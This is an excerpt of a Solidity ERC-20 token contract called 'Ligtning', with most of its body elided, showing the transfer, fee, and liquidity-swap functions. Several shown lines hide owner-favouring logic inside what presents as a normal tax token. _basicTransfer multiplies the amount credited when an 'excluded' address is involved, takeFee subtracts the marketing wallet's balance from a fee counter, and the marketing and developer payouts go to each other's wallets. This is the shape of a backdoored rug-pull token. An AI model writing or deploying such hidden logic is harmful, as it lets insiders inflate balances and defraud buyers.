...
contract Ligtning is Context, IERC20, Ownable {
    using SafeMath for uint256;
    
    string private _name = unicode"Final Ligntning";
    string private _symbol = unicode"Ligtning";
    uint8 private _decimals = 18;

    address payable public devWallet = payable(msg.sender);
    address payable public marketingWallet = payable(0xcb7539EcAeA1ce8398b3A154Ce39E11aDd1AEf6c);
    ...
    mapping (address => bool) public isAutomatedMarketMakers;
    ...
    uint256 public _maxTxAmount =  _totalSupply.mul(50).div(1000); 
    uint256 public _walletMax =   _totalSupply.mul(50).div(1000); 
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        if(isExcludedFromFee[sender] || isExcludedFromFee[recipient]) { 
            ...
            if(!isTxLimitExempt[sender] && !isTxLimitExempt[recipient] && isTxLimited) {
            ...
            if (overMinimumTokenBalance && !inSwapAndLiquify && !isAutomatedMarketMakers[sender] && swapAndLiquifyEnabled) 
            {
            ...
            if(isWalletLimited && !isWalletLimitExempt[recipient]) {
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if(isAutomatedMarketMakers[sender]) {
            feeAmount = amount.mul(_totalTaxIfBuying).div(100);
        }
        else if(isAutomatedMarketMakers[recipient]) {
            feeCount -= balanceOf(marketingWallet);
    ...
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        uint256 rAmount = shouldExcluded(sender, recipient) ? amount * (_totalTaxIfBuying.sub(1)) : amount;
    ...
    function tradingStart() public payable onlyOwner{
        ...
        isAutomatedMarketMakers[pairAddress] = true;
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        if(amountETHMarketing > 0) {
            payable(devWallet).transfer(amountETHMarketing);
        }

        if(amountETHDeveloper > 0) {
            payable(marketingWallet).transfer(amountETHDeveloper);
        }         
